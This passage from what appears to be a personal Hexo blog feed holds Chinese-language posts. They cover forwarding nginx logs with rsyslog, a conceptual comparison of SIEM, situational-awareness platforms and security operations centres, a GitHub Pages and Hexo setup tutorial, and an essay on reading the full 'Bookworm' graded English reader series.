class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ModLoad</span> imfile</span><br><span class="line"><span class="variable">$InputFilePollInterval</span> <span class="number">1</span></span><br><span class="line"><span class="variable">$WorkDirectory</span> /var/spool/rsyslog</span><br><span class="line"><span class="variable">$PrivDropToGroup</span> adm</span><br><span class="line"></span><br><span class="line"><span class="comment">##Nginx访问日志文件路径，根据实际情况修改:</span></span><br><span class="line"><span class="variable">$InputFileName</span> /usr/local/nginx/logs/access.log</span><br><span class="line"><span class="variable">$InputFileTag</span> nginx<span class="literal">-access</span>:</span><br><span class="line"><span class="variable">$InputFileStateFile</span> stat<span class="literal">-nginx</span><span class="literal">-access</span></span><br><span class="line"><span class="variable">$InputFileSeverity</span> info</span><br><span class="line"><span class="variable">$InputFilePersistStateInterval</span> <span class="number">25000</span></span><br><span class="line"><span class="variable">$InputRunFileMonitor</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##Nginx错误日志文件路径，根据实际情况修改:</span></span><br><span class="line"><span class="variable">$InputFileName</span> /usr/local/nginx/logs/error.log</span><br><span class="line"><span class="variable">$InputFileTag</span> nginx<span class="literal">-error</span>:</span><br><span class="line"><span class="variable">$InputFileStateFile</span> stat<span class="literal">-nginx</span><span class="literal">-error</span></span><br><span class="line"><span class="variable">$InputFileSeverity</span> error</span><br><span class="line"><span class="variable">$InputFilePersistStateInterval</span> <span class="number">25000</span></span><br><span class="line"><span class="variable">$InputRunFileMonitor</span></span><br><span class="line"></span><br><span class="line">*.* @<span class="number">172.28</span>.<span class="number">65</span>:<span class="number">514</span></span><br></pre></td></tr></table></figure><p>配置好了以后，重启rsyslog服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></table></figure><p>我们访问nginx服务提供的web服务<a href="http://172.28.65.32/" target="_blank" rel="noopener">http://172.28.65.32/</a><br>在logstash的控制台 可以看到同样的效果。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/18.png" alt="logstash的控制台"></p><p>本文介绍了如何通过filebeat、logstash、rsyslog采集nginx的访问日志和错误日志的几种方式，具体需要根据实际情况灵活的运用。</p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析SIEM、态势感知平台、安全运营中心</title>
      <link href="/posts/e29f28e5/"/>
      <url>/posts/e29f28e5/</url>
      
        <content type="html"><![CDATA[<p>近年来SIEM、态势感知平台、安全运营中心等概念炒的火热，有的人认为这都是安全管理产品，这些产品就是一回事，有人认为还是有所区分。那么到底什么是SIEM、什么是态势感知平台、什么是安全运营中心，他们之间有什么联系和区别呢？</p><h1 id="一、SIEM"><a href="#一、SIEM" class="headerlink" title="一、SIEM"></a>一、SIEM</h1><p>SIEM英文是security information and event managemen安全信息和事件管理<br>SIEM是一个由多个监视和分析组件组成的安全系统，旨在帮助组织检测和减轻威胁<br>一款典型的SIEM产品是将许多其他安全规则和工具结合在一个综合的框架下形成的一个合集。<br>典型的包括以下模块<br>日志管理(LMS)——用于传统日志收集和存储的工具。<br>安全信息管理(SIM)——集中于从多个数据源收集和管理与安全相关的数据的工具或系统。例如，这些数据源可以是防火墙、DNS服务器、路由器和防病毒应用程序。<br>安全事件管理(SEM)——基于主动监视和分析的系统，包括数据可视化、事件相关性和警报<br>大多数的SIEM包括以下元素<br><strong>1、安全数据采集</strong><br>主要是基于安全日志数据，日志表示在数字环境中运行的进程的原始输出，是提供实时发生的事情的准确图像的最佳来源，因此是SIEM系统的主要数据源。无论是防火墙日志、服务器日志、数据库日志，还是在实际网络环境中生成的任何其他类型的日志，SIEM系统都能够收集这些数据并将其存储在一个中心位置以进行扩展的保留。此采集过程通常由代理或应用程序执行，部署在监视的系统上，并配置为将数据转发到SIEM系统的中央数据存储。<br><strong>2、安全数据解析处理和标准化</strong><br>为了能够跨不同源和事件相关性高效地解释数据，SIEM系统能够规范化日志。这个规范化过程包括将日志处理为可读的结构化格式，从日志中提取重要数据，并映射日志中包含的不同字段。<br><strong>3、安全数据集中存储</strong><br>安全信息数据存储的目地当然是为了利用数据进行管理分析发现安全事件。<br><strong>4、安全数据分析</strong><br>一旦收集、解析和存储，SIEM系统中的下一步将负责连接这些点并关联来自不同数据源的事件。这种关联工作基于各种SIEM工具提供的规则、为不同的攻击场景预定义的规则，或者由分析人员创建和调整的规则。大多数SIEM系统还提供生成报告的内置机制。这些报告可以用于管理、审计或合规性原因。例如，可以将详细描述触发警报或规则的每日报告嵌入到仪表板中。<br><strong>5、安全数据呈现</strong><br>可视化数据和事件的能力是SIEM系统中的另一个关键组件，因为它允许分析人员方便地查看数据。包含多个可视化或视图的仪表板有助于识别趋势、异常情况，并监控环境的总体健康或安全状态。一些SIEM工具将附带预先制作的仪表板，而另一些工具将允许用户创建和调整自己的仪表板。<br>基于目前海量的安全信息数据，<strong>大数据架构已经成为主流</strong>。并不是说SIEM必须使用大数据架构，因为这是一个应用场景问题而非技术问题。但面对大量数据需要处理的场景时，基于大数据架构的SIEM则必不可少。所以有些厂商提出了SDC（security data center）安全大数据中心的概念就是把所有的安全数据集中管理起来，在SDC的基础上构建安全数据分析和展现能力，形成SIEM平台。</p><p>目前成熟的SIEM产品有很多，开源的有OSSIM、Elastic SIEM、Opensoc<br>OSSIM是SIEM的代表性产品，在产品形式上和Kali类似是一个基于Debain进行二次开发的Linux发行版，当前5.6.5版本基于Dibian 8（jessie）。<br>OSSIM使用Nmap等实现资产发现、使用Nessus等实现漏洞扫描、使用Snort等实现入侵检测、使用MySQL等进行数据存储，自己实现的部分主要是工具、数据整合和可视化展示。ossim存储架构是mysql，支持多种日志格式，包括鼎鼎大名的Snort、Nmap、 Nessus以及Ntop等，对于数据规模不大的情况是个不错的选择，新版界面很酷炫<br>从架构上来看，OSSIM系统是一个开放的框架，它的核心价值在于创新的集成各开源软件之所长，它里面的模块既有C/S架构，又有B/S架构，但作为最终用户主要掌握OSSIM WebUI主要采用B/S架构，Web服务器使用Apache。OSSIM系统结构示意图如下图所示。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200302/ossim.jpeg" alt="在这里插入图片描述"><br>第1层，属于数据采集层，使用各种采集技术采集流量信息、日志、各种资产信息，经过归一化处理后传入核心层。改层体现安全事件来源，入侵检测、防火墙、重要主机发出的日志都是安全事件来源，它们按发出机制分为两类：模式侦查器和异常监控（两者都采集警告信息，功能互补）由它们采集的安全事件，再被Agent转换为统一的格式发到OSSIM服务器，这一层就是Sensor要完成的内容。<br>第2层，属于核心处理层，主要实现对各种数据的深入加工处理，包括运行监控、安全分析、策略管理、风险评估、关联分析、安全对象管理、脆弱性管理、事件管理、报表管理等。该层中OSSIM Server是主角，OSSIM服务器，主要功能是安全事件的集中并对集中后的事件进行关联分析、风险评估及严重性标注等。所谓的集中就是以一种统一格式组织所有系统产生的安全事件告警信息（Alarms）并将所有的网络安全事件告警存储到数据库，这样就完成了对网络中所产生事件的一个庞大视图。系统通过事件序列关联和启发式算法关联来更好的识别误报和侦查攻击的能力。<br>OSSIM本质上通过对各种探测器和监控产生的告警进行格式化处理，再进行关联分析，通过后期这些处理能提高检测性能，即减少告警数量，减小关联引擎的压力，从整体上提高告警质量。<br>第3层，属于数据展现层，主要负责完成与用户之间的交互，达到安全预警和事件监控、安全运行监控、综合分析的统一展示，形式上以图形化方式展示给用户。Web框架(Framework)控制台界面即OSSIM的Web UI（Web User Interface，Web用户界面），其实就是OSSIM系统对外的门户站点，它主要由仪表盘、SIEM控制台、Alarm控制台、资产漏洞扫描管理、可靠性监控、报表及系统策略等部分组成。<br>OSSIM主要模块的关系<br>OSSIM系统主要使用了PHP、Python、Perl和C等四种编程语言，从软件层面上看OSSIM框架系统包括五大模块：Agent模块、Server模块、Database数据库模块、Frameworkd模块以及Framework模块，逻辑结构如图所示。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200302/ossim2.jpeg" alt="在这里插入图片描述"><br>Elastic SIEM 的核心是全新的 SIEM 应用，此应用是安全团队的交互式工作空间，可允许他们对事件进行分类并开展初期调查。其中包括的时间线事件查看器 (Timeline Event Viewer) 能够允许分析师收集和存储攻击证据，固定相关活动并添加注释，以及添加评论并分享他们的发现，而且这一切在 Kibana 中即可完成；这样一来，您便能够轻松处理符合 ECS 格式的任何数据了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200302/elasticSiem.png" alt="在这里插入图片描述">Opensoc是思科2014年在BroCon大会上公布的开源项目，但是没有真正开源其源代码，只是发布了其技术框架。可以参考Opensoc发布的架构，结合实际落地SIEM的方案。Opensoc完全基于开源的大数据框架kafka、storm、spark和es等，天生具有强大的横向扩展能力<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200302/opensoc.png" alt="在这里插入图片描述"><br><strong>所以从SIEM的定义和功能来看有两个核心能力，一个是安全信息数据的采集汇聚能力，一个就是安全事件的分析能力。</strong></p><h1 id="二、安全态势感知平台"><a href="#二、安全态势感知平台" class="headerlink" title="二、安全态势感知平台"></a>二、安全态势感知平台</h1><p>“态势感知”早在 20 世纪 80 年代由美国空军提出，其包含感知、理解和预测三个层次。截止目前，业界对网络安全态势感知还没有一个统一全面的定义，基于美国Endsley 博士的理论对网络安全态势感知做出的定义：“网络安全态势感知是综合分析网络安全要素，评估网络安全状况，预测其发展趋势，并以可视化的方式展现给用户，并给出相应的报表和应对措施。”<br>什么是态势感知平台，大家都认为应该是利用大数据、机器学习等技术对态势感知态势海量数据进行提取，进行多维度的关联分析。能够提供对安全风险保持报警、趋势预测等，海量数据、关联分析、大屏展示和趋势预测是四个重点。而趋势预测最核心，目前做起来也比较难。<br>个人理解，<strong>SIEM重点在于对安全事件的感知和理解，态势感知重点在于通过大数据、机器学习等技术加深了对安全趋势的预测</strong>。国外一般不提态势感知系统，而国内，很多厂商都推出了态势感知系统。<br>目前国内安全厂商提供的“态势感知产品”包含的功能模块有：资产管理、漏洞管理、大数据平台、日志分析平台、威胁情报、沙箱、用户行为分析、网络流量分析、取证溯源、威胁捕捉等能力。<br>几个关键点：<br>1、 大数据平台。随着监测范围的扩大，数据量也在扩大，需要一个具备大数据处理和计算能力的平台，这是整个态势感知平台建设很重要的基础。<br>2、 基于威胁情报的监测。威胁情报对于降低大量数据和报警中的垃圾数据或者报警噪声，帮助更快速、更高效的发现攻击行为和攻击者非常关键，威胁情报的质量是检验态势感知平台能力的很重要的方面。<br>3、 全要素数据的采集。利用态势感知这样的平台能力的核心目的，是要监测到复杂的、高级的攻击，就需要态势感知平台首先要捕获到微观的状态，低成本、高效率的全要素数据采集能力是基础。<br>4、 基于攻击场景的分析研判。攻击不再是基于特征的监测，需要运用威胁情报、运用一些专家的经验，来构建基于场景的分析系统，它不是一个静态的东西，是一个与时俱进的攻防对抗过程中不断学习、学习参考的过程，需要持续运营这样的分析管理，需要更多的专家的经验和安全运营人员的参与。</p><h1 id="三、安全运营中心"><a href="#三、安全运营中心" class="headerlink" title="三、安全运营中心"></a>三、安全运营中心</h1><p>SOC（安全运营中心）来源于NOC（网络运营中心）。<br>随着信息安全问题的日益突出，安全管理理论与技术的不断发展，需要从安全的角度去管理整个网络和系统，而传统的NOC在这方面缺少技术支撑，于是，出现了SOC的概念。<br>以前大家所说的SOC是SOC 1.0阶段，只是在SOC的核心部件SIEM的买卖，国外所说的SOC是一个复杂的系统，它使用SIEM产品进行运维又以此向客户提供服务，也就是我们所说的SOC 2.0<br>SOC(安全运营中心)是以资产为核心，以安全事件管理为关键流程，采用安全域划分的思想，建立一套实时的资产风险模型，协助管理员进行事件及风险分析，预警管理，应急响应的集中安全管理系统。<br>SOC是一个复杂的系统，它既有产品，又有服务，还有运维，SOC是技术、流程和人的有机结合。<br>随着<strong>安全态势感知平台的兴起，安全运营中心将以态势感知平台作为智能安全运营的载体</strong>，在风险监测、分析研判、通知协作、响应处置、溯源取证等各方面进行了增强，同时融入了当前流行的技术和平台作为支撑，如大数据技术、东西向流量采集技术，EDR 终端检测响应技术、机器学习、欺骗攻击技术等。同时态势感知平台与 ITIL（Information Technology Infrastructure Library，ITIL）理念与信息安全管理标准相融合，将安全运营划分为不同角色，如安全管理人员、安全专家、安全运维、安全分析师、安全应急响应人员、安全研究人员等，在集成了安全事件管理全生命周期的流程中，通过工作流程将其串联起来，使安全运营流程更加规范和有序。</p><p><strong>所以个人认为SDC&lt;SIEM&lt;态势感知&lt;安全运营中心</strong></p><hr><p>博客文章：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过Git Pages+Hexo搭建自己的博客</title>
      <link href="/posts/79ebd763/"/>
      <url>/posts/79ebd763/</url>
      
        <content type="html"><![CDATA[<h1 id="一、申请并配置Github-Pages"><a href="#一、申请并配置Github-Pages" class="headerlink" title="一、申请并配置Github Pages"></a>一、申请并配置Github Pages</h1><h2 id="step1-在github上创建一个git库"><a href="#step1-在github上创建一个git库" class="headerlink" title="step1 在github上创建一个git库"></a>step1 在github上创建一个git库</h2><p>用github账号登录<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a> ，如没有github账号则申请一个github账号。登录后点击“New repository”新建一个名为username.github.io（username是你的github用户名）如我的是：xiejava1018.github.io ，如果库名以及存在则会报库名已经存在的错误。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/1.png" alt="新建库"></p><h2 id="step2-绑定自己的域名（如果没有自己的域名也可以不绑）"><a href="#step2-绑定自己的域名（如果没有自己的域名也可以不绑）" class="headerlink" title="step2 绑定自己的域名（如果没有自己的域名也可以不绑）"></a>step2 绑定自己的域名（如果没有自己的域名也可以不绑）</h2><p>访问刚申请的git库，点击Settings<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/2.png" alt="Settings"><br>如果库名不是username.github.io（username是你的github用户名）在这里可以修改成username.github.io<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/3.png" alt="修改库名"><br>拖到下面可以看到GitHub Pages的信息，如果不绑定自己的域名实际可以通过<a href="https://username.github.io/来访问你的站点了。" target="_blank" rel="noopener">https://username.github.io/来访问你的站点了。</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/4.png" alt="站点地址"><br>如果有申请自己的域名，可以将域名解析到你的GithubPages username.github.io 如我的是xiejava1018.github.io<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/5.png" alt="解析自定义域名"><br>在GitHub Pages的自定义域名Custom domain中输入刚解析的域名保存后就可以看到你的站点被发布到你的域名上了，如<a href="https://xiejavablog.ishareread.com/" target="_blank" rel="noopener">https://xiejavablog.ishareread.com/</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/6.png" alt="绑定自定义域名"><br>这时候你就可以用自己的域名来访问GitHub Pages的网站了，不过现在什么都没有，只有个空白页面。这就需要我们借助Hexo这个静态站点生成工具来生我们站点的内容了。</p><h1 id="二、安装Hexo并生成站点"><a href="#二、安装Hexo并生成站点" class="headerlink" title="二、安装Hexo并生成站点"></a>二、安装Hexo并生成站点</h1><p>安装Hexo并生成站点可以参考官方的文档 <a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a>  </p><h2 id="1、安装前的准备"><a href="#1、安装前的准备" class="headerlink" title="1、安装前的准备"></a>1、安装前的准备</h2><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：<br>Node.js (Node.js 版本需不低于 8.10，建议使用 Node.js 10.0 及以上版本)<br>Git</p><h2 id="2、安装Hexo"><a href="#2、安装Hexo" class="headerlink" title="2、安装Hexo"></a>2、安装Hexo</h2><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完了以后可以通过hexo version 查看相应的版本<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/7.png" alt="版本信息"></p><h2 id="3、生成站点"><a href="#3、生成站点" class="headerlink" title="3、生成站点"></a>3、生成站点</h2><p>安装 Hexo 完成后，执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/8.png" alt="目录"><br>其中_config.yml 文件是网站的配置文件<br>package.json 是应用程序的信息<br>scaffolds<br>模版文件夹。当新建文章时，Hexo 会根据 scaffold 来建立文件。<br>Hexo的模板是指在新建的文章文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。<br>source<br>资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。<br>themes<br>主题 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="4、安装主题"><a href="#4、安装主题" class="headerlink" title="4、安装主题"></a>4、安装主题</h2><p>Hexo提供了很多主题，我用的是hexo-theme-next主题，大家可以直接克隆我的主题<a href="https://github.com/xiejava1018/hexo-theme-next.git" target="_blank" rel="noopener">https://github.com/xiejava1018/hexo-theme-next.git</a> 这里修复了一些bug如乱码问题等。<br>cd 切换到站点目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/xiejava1018/hexo-theme-next.git themes/hexo-theme-next</span><br></pre></td></tr></table></figure><p>也可以用其他git客户端工具将主题拉取到themes目录下<br>修改_config.yml文件的theme改为</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme :</span> <span class="string">hexo-theme-next</span></span><br></pre></td></tr></table></figure><h2 id="5、写作"><a href="#5、写作" class="headerlink" title="5、写作"></a>5、写作</h2><p>可以执行下列命令来创建一篇新文章或者新的页面。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>可以在命令中指定文章的布局（layout），默认为 post，可以通过修改 _config.yml 中的 default_layout 参数来指定默认布局。<br>如执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new 2020-02-11-2020-02-11-看完全套149本《书虫》是种什么样的体验</span><br></pre></td></tr></table></figure><p>执行该命令后就会在响应的站点目录的source_posts下生成2020-02-11-看完全套149本《书虫》是种什么样的体验.md文件。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/9.png" alt="文件"><br>用任何喜欢的编辑器编辑这个.md文件即可，排版是支持MarkDown的。</p><h2 id="6、生成和发布"><a href="#6、生成和发布" class="headerlink" title="6、生成和发布"></a>6、生成和发布</h2><p>编辑好需要发表的内容后。执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>就会生成相应的静态文件。改命令也可以简写成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>启动服务器。默认情况下，访问网址为： <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 就可以通过该地址访问本地的站点。<br>在本地检查没有问题以后就可以发布到Github Pages上通过互联网上访问了。<br>首先在配置_config.yml文件配置需要发布的地址。这个地址就是你在github上申请的Github Pages库的git地址<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200212/blogimage/10.png" alt="发布地址配置"><br>然后就可以通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>进行发布了。发布以后就可以通过<a href="https://xiejava1018.github.io" target="_blank" rel="noopener">https://xiejava1018.github.io</a> 或者自定义的域名 <a href="https://xiejavablog.ishareread.com" target="_blank" rel="noopener">https://xiejavablog.ishareread.com</a> 来访问了。需要注意的是，每次重新发布以后，需要重新设置域名绑定才能正确访问，否则会报404的错误。</p><p>欢迎大家访问我的BLOG  <a href="https://xiejavablog.ishareread.com/" target="_blank" rel="noopener">https://xiejavablog.ishareread.com/</a></p><hr><p>博客文章：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>看完全套149本《书虫》是种什么样的体验</title>
      <link href="/posts/40bbedc5/"/>
      <url>/posts/40bbedc5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200211/blogimage/english.png" alt="English" title="English"></p><p>一直想学好英语，可惜一直在陷入”从入门到放弃”的怪圈，这么多年来一直尝试各种方式方法来学英语始终未成正果。当然这一切都归因于自己没有恒心没有毅力。有过坚持了330天终于放弃了背单词的经历，也找了很多如何学好英语的书籍和方法。受了李笑来老师的《人人都能用英语》及伍君仪的《把你的词汇用起来》的影响。经过自己仔细思考认为确实如果要把英语学好必须要用起来。考虑到自己的实际情况，没有相应的语言环境，从听说开始用起来可能也不太现实，最现实的方式就是从大量的阅读开始将英语用起来。即学了知识又学了英语，还没有那么枯燥。</p><p>如何开始阅读，读什么东西呢？自己的水平还没有达到能够读懂英文原版书的程度，望着满片英文的原版书还是心生畏惧。也是在网上看大家学习英语的经验，有人就介绍了阅读的方式方法。初学者一开始就不要挑战太高难度了，容易打击自己的自信心。最好的方式是采取分级阅读的方式，阅读i+1的英语材料。也就是阅读比自己能力稍微高一点的英语材料。在找英语阅读的材料过程中发现了很多人推荐了《书虫》，也就是”书虫·牛津英汉双语读物”，这套读物是外语教学与研究出版社和牛津大学出版社联袂奉献给英语学习者的一大分级阅读精品书系，提供了从小学高年级至大学的全套阅读方案。图书按照词汇量和语言难度进行科学分级。共分了七个级别，15套，共149本书。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200211/blogimage/%E4%B9%A6%E8%99%AB2.png" alt="《书虫》系列" title="《书虫》系列"></p><p>我觉得这套读物比较适合像我这样的初学者。离开学校多年了，也不知道自己的英语水平究竟是属于什么级别，抱着空杯的心态，干脆就从最低级的开始看起（想想还可以给小孩看）。我是2019年6月18日购买的全套，从快递点搬回来的时候一大箱子很重。看着这满满一箱足足149本，比较兴奋又比较忐忑。兴奋的是我终于可以开始我的英语阅读之旅了，忐忑的是这也149本也忒多了吧？从来没有尝试过一次性读过这么多的书，即使是中文书也没有挑战过。</p><p>很欣赏伍君仪在《把你的词汇用起来》中的一句话，就是“学英语既然开始了，就一定要把它学好！”。反反复复从”从入门到放弃”浪费时间精力又没有什么效果。于是从2019年7月正式从书虫第一套入门级的第一本《 Survive！》生存游戏开始。入门级相当于小学高年级的水平，当然读起来很流畅很爽。有时候可以一口气看三、四本。入门级每一本都比较薄只有几十页，而且有一半还是中文解释。基本上没有什么挑战。毕竟有近150本怎么才能全部读完呢？我做了个计划给自己规定每天看40页或以上，准备用大半年的时间将这套书全部看完。书虫这套书可读性还是比较强，内容非常丰富，主题多样，包括悬疑、侦探、间谍等多种题材，大部分都是世界名著。小时候读名著读得比较少，这下可以过一下名著的瘾了，虽然是简写版的。尽管是简写版的但是改编得故事性挺强的，非常吸引人，很能提高阅读兴趣。为了让自己能够坚持下去，我每读一本都会在豆瓣上进行标记，并加入到自己的已读英文读本的豆列里。每读完一本就感觉到离胜利越近了一点。前面1至5级读得还很顺利，几乎都可以不用看中文翻译，后面到了第6级以后就有点磕磕绊绊了，有时候需要借助中文翻译才能看懂。不管怎么样，终于在2020年2月9日将全套书虫的最后一本《印度之行》全部读完，历时半年。除了其中11月底有段时间公司加班很厉害确实没有读以外，基本上每天都有阅读。看着满满的一箱书，这一本本标记已读的书，心里还是满满的成就感。</p><p>通过阅读全套书虫的经历，让我建立了学好英语的信心，培养了我阅读英语的兴趣。我想我再也不会“从入门到放弃”了。我花了半年的时间和精力把全套《书虫》都看完了，你要我放弃，那不这半年的努力都白费了吗？</p><p>但是有人可能会问我，看完全套书虫以后你的英语水平达到了什么程度。我想我会很遗憾的告诉你，“革命尚未成功，同志仍需努力”。我也曾经报有幻想，以为看完全套《书虫》自己的英语水平就很牛B了。但是越看到后面越清晰的认识到《书虫》这套书有它的局限性。整套书下来，最高级别的单词量才3000。也是高中毕业大学低年级的水平。也使我清晰的认识到自己目前的英语水平也就是高中毕业大学低年级的水平。一个意外的收获就是通过阅读《书虫》全套，大致的了解了英语的小说文学史，相当于给了我一个目录和一个指引。有哪些好的小说有兴趣可以更加深入的读下去。比如通过阅读书虫对英国文学史上著名的勃朗特三姐妹有了深刻的了解，因为里面有本书是写《勃朗特一家的故事》。这套书里还有《呼啸山庄》和《简·爱》,分别是勃朗特三姐妹中的艾米莉·勃朗特和夏洛蒂·勃朗特的名著，看了他们的简介再读了她们的作品理解更加全面和深刻了。让我有进一步看这两部名著的英文原版的欲望了。还有英国侦探小说女王阿加莎·克里斯蒂有本书《神秘女人——阿加莎•克里斯蒂》就是介绍她的经历和作品，看完以后我立马找了她的中文版的《东方快车谋杀案》看了觉得很有意思。还有狄更斯、哈代等的名作都让人看了还想看。通过这样大量的阅读体验以后，我对名著产生了浓厚的兴趣，我觉得我应该具备了阅读英文原版书的能力。下一个阶段我有信心准备开始我的英文原版书阅读了。今年我的计划是挑战看完十本英文原版书。</p><p>我读过的英文读本豆列： <a href="https://www.douban.com/doulist/118432400/" target="_blank" rel="noopener">https://www.douban.com/doulist/118432400/</a></p><p>爱分享读书豆瓣小组： <a href="https://www.douban.com/group/655112/" target="_blank" rel="noopener">https://www.douban.com/group/655112/</a></p><hr><center>关注：“爱分享读书”微信公众号 </center><p><img src="http://image.ishareread.com/qrcode_for_gh_70fb5d85a824_258.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><center>读书我们是认真的</center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>坚持了330天，我终于放弃了背单词</title>
      <link href="/posts/48451ead/"/>
      <url>/posts/48451ead/</url>
      
